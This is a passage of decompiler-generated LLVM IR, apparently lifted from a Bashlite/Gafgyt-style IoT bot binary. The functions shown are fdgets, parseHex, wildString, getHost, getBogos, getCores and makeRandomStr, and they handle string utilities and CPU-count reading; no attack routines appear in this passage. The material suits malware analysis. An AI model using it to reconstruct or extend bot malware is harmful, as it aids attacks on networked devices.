  br i1 %v1_8048c77, label %dec_label_pc_8048c85, label %dec_label_pc_8048c79

dec_label_pc_8048c79:                             ; preds = %dec_label_pc_8048c3e
  %v1_8048c79 = call i32 @__errno_location(i32 %v3_8048c65)
  %v1_8048c7e = inttoptr i32 %v1_8048c79 to i32*
  %v2_8048c7e = load i32, i32* %v1_8048c7e, align 4
  %v9_8048c80 = icmp eq i32 %v2_8048c7e, 4
  br i1 %v9_8048c80, label %dec_label_pc_8048c3e, label %dec_label_pc_8048c85

dec_label_pc_8048c85:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048c3e
  %v13_8048c70.lcssa = phi i1 [ true, %dec_label_pc_8048c79 ], [ false, %dec_label_pc_8048c3e ]
  %v3_8048c9e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048c9e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048c9e, i32 0)
  %v2_8048ca9 = mul i32 %tmp6, 4
  %v0_8048cae = load i8*, i8** @global_var_805f560.13, align 4
  %v1_8048cae = ptrtoint i8* %v0_8048cae to i32
  %v2_8048cb3 = add i32 %v1_8048cae, %v2_8048ca9
  %v1_8048cb6 = inttoptr i32 %v2_8048cb3 to i32*
  store i32 0, i32* %v1_8048cb6, align 4
  br i1 %v13_8048c70.lcssa, label %dec_label_pc_8048ced, label %dec_label_pc_8048cc5

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c85
  %v3_8048cc5 = load i32, i32* %stack_var_-268, align 4
  %v1_8048cd1 = and i32 %v3_8048cc5, 65280
  %v2_8048cd81 = udiv i32 %v1_8048cd1, 256
  br label %dec_label_pc_8048ced

dec_label_pc_8048ced:                             ; preds = %dec_label_pc_8048c85, %dec_label_pc_8048cc5
  %storemerge2 = phi i32 [ %v2_8048cd81, %dec_label_pc_8048cc5 ], [ -1, %dec_label_pc_8048c85 ]
  %v2_8048cff.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048cf9

dec_label_pc_8048cf9:                             ; preds = %entry, %dec_label_pc_8048b9e, %dec_label_pc_8048ced
  %v2_8048cff = phi i32 [ %v2_8048cff.pre, %dec_label_pc_8048ced ], [ %v0_8048b8c, %dec_label_pc_8048b9e ], [ %v0_8048b8c, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048ced ], [ -1, %dec_label_pc_8048b9e ], [ -1, %entry ]
  store i32 %v2_8048cff, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c65, { 1, 0 }
  uselistorder i32 %v2_8048ba1, { 1, 0 }
  uselistorder i8* %v0_8048b95, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_805f560.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048cf9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ced, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048d40

dec_label_pc_8048d17:                             ; preds = %dec_label_pc_8048d48
  %v3_8048d2f = inttoptr i32 %v5_8048d4b to i32*
  %v4_8048d2f = call i32 @__libc_read(i32 %arg3, i32* %v3_8048d2f, i32 1)
  %v4_8048d37 = add nuw i32 %storemerge113, 1
  %v8_8048d3a = icmp eq i32 %v4_8048d2f, 0
  %v12_8048d3a = icmp eq i32 %v4_8048d2f, 1
  %v1_8048d3e = icmp eq i1 %v12_8048d3a, false
  br i1 %v1_8048d3e, label %dec_label_pc_8048d56, label %dec_label_pc_8048d40

dec_label_pc_8048d40:                             ; preds = %entry, %dec_label_pc_8048d17
  %v8_8048d3a14 = phi i1 [ false, %entry ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  %storemerge113 = phi i32 [ 0, %entry ], [ %v4_8048d37, %dec_label_pc_8048d17 ]
  %v5_8048d46 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_8048d46, label %dec_label_pc_8048d48, label %dec_label_pc_8048d56

dec_label_pc_8048d48:                             ; preds = %dec_label_pc_8048d40
  %v5_8048d4b = add i32 %storemerge113, %arg1
  %v1_8048d4e = add i32 %v5_8048d4b, -1
  %v1_8048d4f = inttoptr i32 %v1_8048d4e to i8*
  %v2_8048d4f = load i8, i8* %v1_8048d4f, align 1
  %v10_8048d52 = icmp eq i8 %v2_8048d4f, 10
  %v1_8048d54 = icmp eq i1 %v10_8048d52, false
  br i1 %v1_8048d54, label %dec_label_pc_8048d17, label %dec_label_pc_8048d56

dec_label_pc_8048d56:                             ; preds = %dec_label_pc_8048d40, %dec_label_pc_8048d48, %dec_label_pc_8048d17
  %v8_8048d3a.lcssa = phi i1 [ %v8_8048d3a14, %dec_label_pc_8048d40 ], [ %v8_8048d3a14, %dec_label_pc_8048d48 ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  br i1 %v8_8048d3a.lcssa, label %dec_label_pc_8048d6b, label %dec_label_pc_8048d5c

dec_label_pc_8048d5c:                             ; preds = %dec_label_pc_8048d56
  br label %dec_label_pc_8048d6b

dec_label_pc_8048d6b:                             ; preds = %dec_label_pc_8048d56, %dec_label_pc_8048d5c
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d5c ], [ 0, %dec_label_pc_8048d56 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d4b, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_8048d3a14, { 1, 0 }
  uselistorder i1 %v8_8048d3a, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d6b, { 1, 0 }
  uselistorder label %dec_label_pc_8048d56, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d40, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048d9f2 = ptrtoint i8* %arg1 to i32
  %v2_8048da23 = load i8, i8* %arg1, align 1
  %v4_8048da55 = icmp eq i8 %v2_8048da23, 0
  br i1 %v4_8048da55, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048da9
  %v2_8048d84 = mul i32 %stack_var_-8.011, 16
  %v2_8048d8a = load i8, i8* %stack_var_4.012, align 1
  %v3_8048d8a = zext i8 %v2_8048d8a to i32
  %v1_8048d90 = mul nuw nsw i32 %v3_8048d8a, 4
  %v2_8048d90 = add i32 %v1_8048d90, ptrtoint (i32* @global_var_8058040.17 to i32)
  %v3_8048d90 = inttoptr i32 %v2_8048d90 to i32*
  %v4_8048d90 = load i32, i32* %v3_8048d90, align 4
  %v2_8048d97 = or i32 %v4_8048d90, %v2_8048d84
  %v5_8048d9c = add i32 %v4_8048d9f13, 1
  %v22_8048d9c = inttoptr i32 %v5_8048d9c to i8*
  %v2_8048da2 = load i8, i8* %v22_8048d9c, align 1
  %v4_8048da5 = icmp eq i8 %v2_8048da2, 0
  br i1 %v4_8048da5, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048da9:                             ; preds = %entry, %dec_label_pc_8048d7f
  %v4_8048d9f13 = phi i32 [ %v5_8048d9c, %dec_label_pc_8048d7f ], [ %v4_8048d9f2, %entry ]
  %stack_var_4.012 = phi i8* [ %v22_8048d9c, %dec_label_pc_8048d7f ], [ %arg1, %entry ]
  %stack_var_-8.011 = phi i32 [ %v2_8048d97, %dec_label_pc_8048d7f ], [ 0, %entry ]
  %v5_8048da9 = icmp slt i32 %stack_var_-8.011, 0
  %v1_8048dad = icmp eq i1 %v5_8048da9, false
  br i1 %v1_8048dad, label %dec_label_pc_8048d7f, label %dec_label_pc_8048daf

dec_label_pc_8048daf:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048da9, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %v2_8048d97, %dec_label_pc_8048d7f ], [ %stack_var_-8.011, %dec_label_pc_8048da9 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.011, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048daf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048da9, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp11 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048db7 = load i32, i32* @ebx, align 4
  store i32 %v0_8048db7, i32* %stack_var_-8, align 4
  %v4_8048dbb = ptrtoint i8* %arg1 to i32
  %v2_8048dbe = load i8, i8* %arg1, align 1
  %v12_8048dc7 = icmp eq i8 %v2_8048dbe, 42
  br i1 %v12_8048dc7, label %dec_label_pc_8048def, label %dec_label_pc_8048dcd

dec_label_pc_8048dcd:                             ; preds = %entry
  %v12_8048dcd = icmp eq i8 %v2_8048dbe, 63
  br i1 %v12_8048dcd, label %dec_label_pc_8048e42, label %dec_label_pc_8048dd3

dec_label_pc_8048dd3:                             ; preds = %dec_label_pc_8048dcd
  %v4_8048dd3 = icmp eq i8 %v2_8048dbe, 0
  br i1 %v4_8048dd3, label %dec_label_pc_8048dde, label %dec_label_pc_8048e7c

dec_label_pc_8048dde:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048de1 = load i8, i8* %tmp11, align 1
  %v3_8048de1 = zext i8 %v2_8048de1 to i32
  br label %dec_label_pc_8048ed2

dec_label_pc_8048def:                             ; preds = %entry
  %v1_8048df2 = add i32 %v4_8048dbb, 1
  %v4_8048dfa = inttoptr i32 %v1_8048df2 to i8*
  %v5_8048dfd = call i32 @wildString(i8* %v4_8048dfa, i32 %arg2)
  %v1_8048e02 = icmp eq i32 %v5_8048dfd, 0
  br i1 %v1_8048e02, label %dec_label_pc_8048e30, label %dec_label_pc_8048e06

dec_label_pc_8048e06:                             ; preds = %dec_label_pc_8048def
  %v2_8048e09 = load i8, i8* %tmp11, align 1
  %v4_8048e0c = icmp eq i8 %v2_8048e09, 0
  br i1 %v4_8048e0c, label %dec_label_pc_8048e37, label %dec_label_pc_8048e10

dec_label_pc_8048e10:                             ; preds = %dec_label_pc_8048e06
  %v1_8048e13 = add i32 %arg2, 1
  %v5_8048e1e = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048e13)
  %v1_8048e23 = icmp eq i32 %v5_8048e1e, 0
  br i1 %v1_8048e23, label %dec_label_pc_8048e30, label %dec_label_pc_8048e37

dec_label_pc_8048e30:                             ; preds = %dec_label_pc_8048e10, %dec_label_pc_8048def
  br label %dec_label_pc_8048e37

dec_label_pc_8048e37:                             ; preds = %dec_label_pc_8048e06, %dec_label_pc_8048e10, %dec_label_pc_8048e30
  %storemerge4 = phi i32 [ 0, %dec_label_pc_8048e30 ], [ 1, %dec_label_pc_8048e10 ], [ 1, %dec_label_pc_8048e06 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e42:                             ; preds = %dec_label_pc_8048dcd
  %v2_8048e45 = load i8, i8* %tmp11, align 1
  %v4_8048e48 = icmp eq i8 %v2_8048e45, 0
  br i1 %v4_8048e48, label %dec_label_pc_8048e74, label %dec_label_pc_8048e4c

dec_label_pc_8048e4c:                             ; preds = %dec_label_pc_8048e42
  %v1_8048e4f = add i32 %arg2, 1
  %v1_8048e53 = add i32 %v4_8048dbb, 1
  %v4_8048e58 = inttoptr i32 %v1_8048e53 to i8*
  %v5_8048e5b = call i32 @wildString(i8* %v4_8048e58, i32 %v1_8048e4f)
  %v1_8048e60 = icmp ne i32 %v5_8048e5b, 0
  %. = zext i1 %v1_8048e60 to i32
  br label %dec_label_pc_8048e74

dec_label_pc_8048e74:                             ; preds = %dec_label_pc_8048e4c, %dec_label_pc_8048e42
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8048e42 ], [ %., %dec_label_pc_8048e4c ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e7c:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048e7f = load i8, i8* %arg1, align 1
  %v3_8048e7f = zext i8 %v2_8048e7f to i32
  %v2_8048e88 = call i32 @__GI_toupper(i32 %v3_8048e7f)
  store i32 %v2_8048e88, i32* @ebx, align 4
  %v2_8048e92 = load i8, i8* %tmp11, align 1
  %v3_8048e92 = zext i8 %v2_8048e92 to i32
  %v2_8048e9b = call i32 @__GI_toupper(i32 %v3_8048e92)
  %v0_8048ea0 = load i32, i32* @ebx, align 4
  %v12_8048ea0 = icmp eq i32 %v0_8048ea0, %v2_8048e9b
  %v1_8048ea2 = icmp eq i1 %v12_8048ea0, false
  br i1 %v1_8048ea2, label %dec_label_pc_8048ecc, label %dec_label_pc_8048ea4

dec_label_pc_8048ea4:                             ; preds = %dec_label_pc_8048e7c
  %v1_8048ea7 = add i32 %arg2, 1
  %v1_8048eab = add i32 %v4_8048dbb, 1
  %v4_8048eb0 = inttoptr i32 %v1_8048eab to i8*
  %v5_8048eb3 = call i32 @wildString(i8* %v4_8048eb0, i32 %v1_8048ea7)
  %v1_8048eb8 = icmp ne i32 %v5_8048eb3, 0
  %.5 = zext i1 %v1_8048eb8 to i32
  br label %dec_label_pc_8048ecc

dec_label_pc_8048ecc:                             ; preds = %dec_label_pc_8048ea4, %dec_label_pc_8048e7c
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e7c ], [ %.5, %dec_label_pc_8048ea4 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048ed2:                             ; preds = %dec_label_pc_8048e74, %dec_label_pc_8048e37, %dec_label_pc_8048dde, %dec_label_pc_8048ecc
  %stack_var_-24.0 = phi i32 [ %storemerge4, %dec_label_pc_8048e37 ], [ %storemerge3, %dec_label_pc_8048e74 ], [ %v3_8048de1, %dec_label_pc_8048dde ], [ %storemerge, %dec_label_pc_8048ecc ]
  %v2_8048ed8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048ed8, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048dbe, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048ed2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e37, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048edb = load i32, i32* @ebp, align 4
  %v1_8048ee7 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048ee7, i32* %arg2, align 4
  %v10_8048ef8 = icmp eq i32 %v1_8048ee7, -1
  %. = zext i1 %v10_8048ef8 to i32
  store i32 %v0_8048edb, i32* @ebp, align 4
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048f12 = load i32, i32* @ebp, align 4
  store i32 %v0_8048f12, i32* %stack_var_-4, align 4
  %v4_8048f354 = ptrtoint i8* %arg1 to i32
  %v2_8048f385 = load i8, i8* %arg1, align 1
  %v4_8048f3b7 = icmp eq i8 %v2_8048f385, 0
  %v1_8048f3d9 = icmp eq i1 %v4_8048f3b7, false
  br i1 %v1_8048f3d9, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f3f

dec_label_pc_8048f1a:                             ; preds = %entry, %dec_label_pc_8048f1a
  %v4_8048f3511 = phi i32 [ %v5_8048f32, %dec_label_pc_8048f1a ], [ %v4_8048f354, %entry ]
  %stack_var_4.010 = phi i8* [ %v22_8048f32, %dec_label_pc_8048f1a ], [ %arg1, %entry ]
  %v2_8048f1d = load i8, i8* %stack_var_4.010, align 1
  %v3_8048f1d = zext i8 %v2_8048f1d to i32
  %v1_8048f26 = call i32 @__GI_toupper(i32 %v3_8048f1d)
  %v1_8048f30 = trunc i32 %v1_8048f26 to i8
  store i8 %v1_8048f30, i8* %stack_var_4.010, align 1
  %v5_8048f32 = add i32 %v4_8048f3511, 1
  %v22_8048f32 = inttoptr i32 %v5_8048f32 to i8*
  %v2_8048f38 = load i8, i8* %v22_8048f32, align 1
  %v4_8048f3b = icmp eq i8 %v2_8048f38, 0
  %v1_8048f3d = icmp eq i1 %v4_8048f3b, false
  br i1 %v1_8048f3d, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge

dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge: ; preds = %dec_label_pc_8048f1a
  %v2_8048f3f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048f3f

dec_label_pc_8048f3f:                             ; preds = %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge, %entry
  %v2_8048f3f = phi i32 [ %v2_8048f3f.pre, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v0_8048f12, %entry ]
  %v3_8048f38.lcssa.in = phi i8 [ %v2_8048f38, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v2_8048f385, %entry ]
  %v3_8048f38.lcssa = zext i8 %v3_8048f38.lcssa.in to i32
  store i32 %v2_8048f3f, i32* @ebp, align 4
  ret i32 %v3_8048f38.lcssa

; uselistorder directives
  uselistorder i8* %v22_8048f32, { 1, 0 }
  uselistorder i32 %v5_8048f32, { 1, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder label %dec_label_pc_8048f1a, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048f5a = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058440.18, i32 0, i32 0), i32 0)
  %v2_80490ba = ptrtoint i32* %stack_var_-4112 to i32
  %tmp22 = bitcast i32* %stack_var_-4112 to i8*
  %v5_80490d224 = call i32 @fdgets(i32 %v2_80490ba, i32 4096, i32 %v5_8048f5a)
  %v1_80490d725 = icmp eq i32 %v5_80490d224, 0
  %v1_80490d927 = icmp eq i1 %v1_80490d725, false
  br i1 %v1_80490d927, label %dec_label_pc_8048f67, label %dec_label_pc_80490df

dec_label_pc_8048f67:                             ; preds = %entry, %dec_label_pc_8049099
  %v3_8048f70 = call i32 @uppercase(i8* %tmp22)
  %v5_8048f86 = call i32 @strstr(i32 %v2_80490ba, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805844e.19, i32 0, i32 0))
  %v12_8048f93 = icmp eq i32 %v5_8048f86, %v2_80490ba
  %v1_8048f95 = icmp eq i1 %v12_8048f93, false
  br i1 %v1_8048f95, label %dec_label_pc_8049099, label %dec_label_pc_8048f9b

dec_label_pc_8048f9b:                             ; preds = %dec_label_pc_8048f67
  %tmp23 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048fac

dec_label_pc_8048fa9:                             ; preds = %dec_label_pc_8048fc0, %dec_label_pc_8048fb6, %dec_label_pc_8048fac
  %v5_8048fa9 = add i32 %v4_8048fac, 1
  %v22_8048fa9 = inttoptr i32 %v5_8048fa9 to i8*
  br label %dec_label_pc_8048fac

dec_label_pc_8048fac:                             ; preds = %dec_label_pc_8048f9b, %dec_label_pc_8048fa9
  %storemerge4 = phi i8* [ %v22_8048fa9, %dec_label_pc_8048fa9 ], [ %tmp23, %dec_label_pc_8048f9b ]
  %v4_8048fac = ptrtoint i8* %storemerge4 to i32
  %v2_8048faf = load i8, i8* %storemerge4, align 1
  %v7_8048fb2 = icmp eq i8 %v2_8048faf, 32
  br i1 %v7_8048fb2, label %dec_label_pc_8048fa9, label %dec_label_pc_8048fb6

dec_label_pc_8048fb6:                             ; preds = %dec_label_pc_8048fac
  %v2_8048fb9 = load i8, i8* %storemerge4, align 1
  %v10_8048fbc = icmp eq i8 %v2_8048fb9, 9
  br i1 %v10_8048fbc, label %dec_label_pc_8048fa9, label %dec_label_pc_8048fc0

dec_label_pc_8048fc0:                             ; preds = %dec_label_pc_8048fb6
  %v2_8048fc3 = load i8, i8* %storemerge4, align 1
  %v10_8048fc6 = icmp eq i8 %v2_8048fc3, 58
  br i1 %v10_8048fc6, label %dec_label_pc_8048fa9, label %dec_label_pc_8048ff1.preheader

dec_label_pc_8048ff1.preheader:                   ; preds = %dec_label_pc_8048fc0
  br label %dec_label_pc_8048ff1

dec_label_pc_8048fcc:                             ; preds = %dec_label_pc_804901a, %dec_label_pc_8048ff1
  %v3_8048fe3 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048fea = add i32 %v4_8048fac, %v3_8048fe3
  %v1_8048fed = add i32 %v6_8048fea, -1
  %v1_8048fee = inttoptr i32 %v1_8048fed to i8*
  store i8 0, i8* %v1_8048fee, align 1
  br label %dec_label_pc_8048ff1

dec_label_pc_8048ff1:                             ; preds = %dec_label_pc_8048ff1.preheader, %dec_label_pc_8048fcc
  %v3_8049008 = call i32 @_strlen(i8* %storemerge4)
  %v6_804900f = add i32 %v4_8048fac, %v3_8049008
  %v1_8049012 = add i32 %v6_804900f, -1
  %v1_8049013 = inttoptr i32 %v1_8049012 to i8*
  %v2_8049013 = load i8, i8* %v1_8049013, align 1
  %v10_8049016 = icmp eq i8 %v2_8049013, 13
  br i1 %v10_8049016, label %dec_label_pc_8048fcc, label %dec_label_pc_804901a

dec_label_pc_804901a:                             ; preds = %dec_label_pc_8048ff1
  store i1 false, i1* @df, align 1
  store i32 %v4_8048fac, i32* @edi, align 4
  %v3_8049031 = call i32 @_strlen(i8* %storemerge4)
  %v6_8049038 = add i32 %v4_8048fac, %v3_8049031
  %v1_804903b = add i32 %v6_8049038, -1
  %v1_804903c = inttoptr i32 %v1_804903b to i8*
  %v2_804903c = load i8, i8* %v1_804903c, align 1
  %v10_804903f = icmp eq i8 %v2_804903c, 10
  br i1 %v10_804903f, label %dec_label_pc_8048fcc, label %dec_label_pc_8049043

dec_label_pc_8049043:                             ; preds = %dec_label_pc_804901a
  %v5_8049051 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_8049056 = icmp eq i32 %v5_8049051, 0
  br i1 %v1_8049056, label %dec_label_pc_8049070, label %dec_label_pc_804905a

dec_label_pc_804905a:                             ; preds = %dec_label_pc_8049043
  %v5_8049068 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8049068 = inttoptr i32 %v5_8049068 to i8*
  store i8 0, i8* %v6_8049068, align 1
  br label %dec_label_pc_8049070

dec_label_pc_8049070:                             ; preds = %dec_label_pc_8049043, %dec_label_pc_804905a
  store i32 %v4_8048fac, i32* @eax, align 4
  %v4_804907a = inttoptr i32 %arg1 to i8*
  %v5_804907d = call i32 @strcpy(i8* %v4_804907a, i32 %v4_8048fac)
  %v2_8049088 = call i32 @__libc_close(i32 %v5_8048f5a)
  br label %dec_label_pc_80490f4

dec_label_pc_8049099:                             ; preds = %dec_label_pc_8048f67
  %v6_80490b5 = call i32 @__GI_memset(i8* %tmp22, i32 0, i32 4096)
  %v5_80490d2 = call i32 @fdgets(i32 %v2_80490ba, i32 4096, i32 %v5_8048f5a)
  %v1_80490d7 = icmp eq i32 %v5_80490d2, 0
  %v1_80490d9 = icmp eq i1 %v1_80490d7, false
  br i1 %v1_80490d9, label %dec_label_pc_8048f67, label %dec_label_pc_80490df

dec_label_pc_80490df:                             ; preds = %dec_label_pc_8049099, %entry
  %v2_80490e5 = call i32 @__libc_close(i32 %v5_8048f5a)
  br label %dec_label_pc_80490f4

dec_label_pc_80490f4:                             ; preds = %dec_label_pc_8049070, %dec_label_pc_80490df
  %storemerge = phi i32 [ 1, %dec_label_pc_80490df ], [ 0, %dec_label_pc_8049070 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048fac, { 4, 3, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_80490ba, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8048f5a, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_80490f4, { 1, 0 }
  uselistorder label %dec_label_pc_8049070, { 1, 0 }
  uselistorder label %dec_label_pc_8048ff1, { 1, 0 }
  uselistorder label %dec_label_pc_8048fac, { 1, 0 }
  uselistorder label %dec_label_pc_8048f67, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049103 = load i32, i32* @ebp, align 4
  store i32 %v0_8049103, i32* %stack_var_-4, align 4
  %v4_8049103 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049103, i32* @ebp, align 4
  %v5_8049122 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058440.18, i32 0, i32 0), i32 0)
  %v2_8049180 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp10 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804919811 = call i32 @fdgets(i32 %v2_8049180, i32 4096, i32 %v5_8049122)
  %v1_804919d12 = icmp eq i32 %v5_804919811, 0
  %v1_804919f14 = icmp eq i1 %v1_804919d12, false
  br i1 %v1_804919f14, label %dec_label_pc_804912c, label %dec_label_pc_80491a1

dec_label_pc_804912c:                             ; preds = %entry, %dec_label_pc_804915f
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.0, %dec_label_pc_804915f ], [ 0, %entry ]
  %v3_8049135 = call i32 @uppercase(i8* %tmp10)
  %v5_804914b = call i32 @strstr(i32 %v2_8049180, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805844e.19, i32 0, i32 0))
  %v12_8049158 = icmp eq i32 %v5_804914b, %v2_8049180
  %v1_804915a = icmp eq i1 %v12_8049158, false
  br i1 %v1_804915a, label %dec_label_pc_804915f, label %dec_label_pc_804915c

dec_label_pc_804915c:                             ; preds = %dec_label_pc_804912c
  %v4_804915c = add i32 %stack_var_-12.115, 1
  br label %dec_label_pc_804915f

dec_label_pc_804915f:                             ; preds = %dec_label_pc_804912c, %dec_label_pc_804915c
  %stack_var_-12.0 = phi i32 [ %stack_var_-12.115, %dec_label_pc_804912c ], [ %v4_804915c, %dec_label_pc_804915c ]
  %v6_804917b = call i32 @__GI_memset(i8* %tmp10, i32 0, i32 4096)
  %v5_8049198 = call i32 @fdgets(i32 %v2_8049180, i32 4096, i32 %v5_8049122)
  %v1_804919d = icmp eq i32 %v5_8049198, 0
  %v1_804919f = icmp eq i1 %v1_804919d, false
  br i1 %v1_804919f, label %dec_label_pc_804912c, label %dec_label_pc_80491a1

dec_label_pc_80491a1:                             ; preds = %dec_label_pc_804915f, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_804915f ]
  %v2_80491a7 = call i32 @__libc_close(i32 %v5_8049122)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %v2_8049180, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8049122, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_804915f, { 1, 0 }
  uselistorder label %dec_label_pc_804912c, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80491b1 = load i32, i32* @ebp, align 4
  store i32 %v0_80491b1, i32* %stack_var_-4, align 4
  %v0_80491b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80491b4, i32* %stack_var_-8, align 4
  %v5_80491cd = ptrtoint i8* %arg1 to i32
  %v5_804921325 = icmp sgt i32 %arg2, 0
  br i1 %v5_804921325, label %dec_label_pc_80491c8, label %dec_label_pc_8049215

dec_label_pc_80491c8:                             ; preds = %entry, %dec_label_pc_80491c8
  %storemerge26 = phi i32 [ %v4_804920a, %dec_label_pc_80491c8 ], [ 0, %entry ]
  %v6_80491cd = add i32 %storemerge26, %v5_80491cd
  store i32 %v6_80491cd, i32* @ebx, align 4
  %v1_80491d0 = call i32 @rand_cmwc(i32 %storemerge26)
  %v2_80491e5 = udiv i32 %v1_80491d0, 26
  %tmp = mul i32 %v2_80491e5, -10
  %v2_80491fd = add i32 %v1_80491d0, %tmp
  %v14_80491fd = trunc i32 %v2_80491fd to i8
  %v2_8049206 = add i8 %v14_80491fd, 65
  %v2_8049208 = load i32, i32* @ebx, align 4
  %v3_8049208 = inttoptr i32 %v2_8049208 to i8*
  store i8 %v2_8049206, i8* %v3_8049208, align 1
  %v4_804920a = add nuw nsw i32 %storemerge26, 1
  %exitcond = icmp eq i32 %v4_804920a, %arg2
  br i1 %exitcond, label %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge, label %dec_label_pc_80491c8

dec_label_pc_804920d.dec_label_pc_8049215_crit_edge: ; preds = %dec_label_pc_80491c8
  %v2_8049218.pre = load i32, i32* %stack_var_-8, align 4
  %v2_8049219.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049215

dec_label_pc_8049215:                             ; preds = %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge, %entry
  %v2_8049219 = phi i32 [ %v2_8049219.pre, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ %v0_80491b1, %entry ]
  %v2_8049218 = phi i32 [ %v2_8049218.pre, %dec_label_pc_804920d.dec_label_pc_8049215_crit_edge ], [ %v0_80491b4, %entry ]
